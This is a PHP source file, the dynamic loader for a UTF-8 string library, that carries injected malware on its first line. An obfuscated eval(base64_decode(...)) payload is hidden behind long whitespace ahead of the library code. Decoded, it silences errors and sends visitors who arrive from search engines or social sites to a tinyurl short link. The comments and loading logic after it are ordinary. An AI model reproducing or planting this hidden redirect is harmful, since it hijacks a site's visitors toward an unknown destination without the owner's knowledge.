<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* This is the dynamic loader for the library. It checks whether you have
* the mbstring extension available and includes relevant files
* on that basis, falling back to the native (as in written in PHP) version
* if mbstring is unavailabe.
*
* It's probably easiest to use this, if you don't want to understand
* the dependencies involved, in conjunction with PHP versions etc. At
* the same time, you might get better performance by managing loading
* yourself. The smartest way to do this, bearing in mind performance,
* is probably to "load on demand" - i.e. just before you use these
* functions in your code, load the version you need.
*
* It makes sure the the following functions are available;
* utf8_strlen, utf8_strpos, utf8_strrpos, utf8_substr,
* utf8_strtolower, utf8_strtoupper
* Other functions in the ./native directory depend on these
* six functions being available
* @package utf8
*/

/**
* Put the current directory in this constant
*/
if ( !defined('UTF8') ) {
    define('UTF8',dirname(__FILE__));
}

/**
* If string overloading is active, it will break many of the
* native implementations. mbstring.func_overload must be set
* to 0, 1 or 4 in php.ini (string overloading disabled).
* Also need to check we have the correct internal mbstring
* encoding
*/
if ( extension_loaded('mbstring')) {
    if ( ini_get('mbstring.func_overload') & MB_OVERLOAD_STRING ) {
        trigger_error('String functions are overloaded by mbstring',E_USER_ERROR);
    }
    mb_internal_encoding('UTF-8');
}

/**
* Load the faster strlen if mbstring available
*/
if ( !defined('UTF8_STRLEN') ) {
    if ( function_exists('mb_strlen') ) {
        mb_internal_encoding('UTF-8');
        require_once UTF8 . '/mbstring/strlen.php';
    } else {
        require_once UTF8 . '/native/strlen.php';
    }
}

/**
* Load the smartest implementations of utf8_strpos, utf8_strrpos
* and utf8_substr
*/
if ( !defined('UTF8_CORE') ) {
    if ( function_exists('mb_substr') ) {
        require_once UTF8 . '/mbstring/core.php';
    } else {
        require_once UTF8 . '/native/core.php';
    }
}

/**
* Load the smartest implementations of utf8_strtolower and
* utf8_strtoupper
*/
if ( !defined('UTF8_CASE') ) {
    if ( function_exists('mb_strtolower') ) {
        require_once UTF8 . '/mbstring/case.php';
    } else {
        require_once UTF8 . '/utils/unicode.php';
        require_once UTF8 . '/native/case.php';
    }
}

/**
* Load the native implementation of utf8_substr_replace
*/
require_once UTF8 . '/substr_replace.php';

/**
* You should now be able to use all the other utf_* string functions
*/
